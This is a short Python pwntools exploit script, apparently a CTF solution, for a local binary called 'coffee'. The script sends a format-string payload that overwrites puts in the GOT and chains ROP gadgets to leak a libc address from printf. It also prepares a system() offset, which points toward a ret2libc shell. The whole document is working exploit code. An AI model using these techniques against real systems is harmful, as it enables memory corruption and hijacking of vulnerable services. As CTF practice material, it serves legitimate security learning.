from pwn import *

# r = remote("34.146.101.4", 30002)
r = process("./coffee")
# gdb.attach(r)

puts_got = 0x404018
printf_got = 0x404028
printf_offset = 0x0000000000064e10
puts_real = 0x401030
main = 0x0000000000401196
x = 0x0000000000404048
equal = 0x00000000004011dc
printf_lib = 0x0000000000064e10 
system_lib = 0x0000000000055410
pop4_ret = 0x000000000040128c
pop_rdi_ret = 0x0000000000401293
ret_gadget = 0x000000000040101a

# payload = "%9$4096s" + "%8$hn---" + p64(puts_got) + p64(printf_got)
# payload = "----%10$hhn%4568p" + "%9$hn--" + p64(puts_got) + p64(printf_got+1)
payload = "%3$4748p%8$hn---"
payload += p64(puts_got)
# leak libc
payload += p64(ret_gadget)
payload += p64(pop_rdi_ret) + p64(printf_got) + p64(puts_real)
# ret
payload += p64(main)

# print(payload)

# payload = "a"*(8*3)
# payload += 
r.sendline(payload)
leak = r.recvuntil("\x7f")[-6:] + "\x00\x00"
leak = u64(leak)
print(hex(leak))

r.interactive()
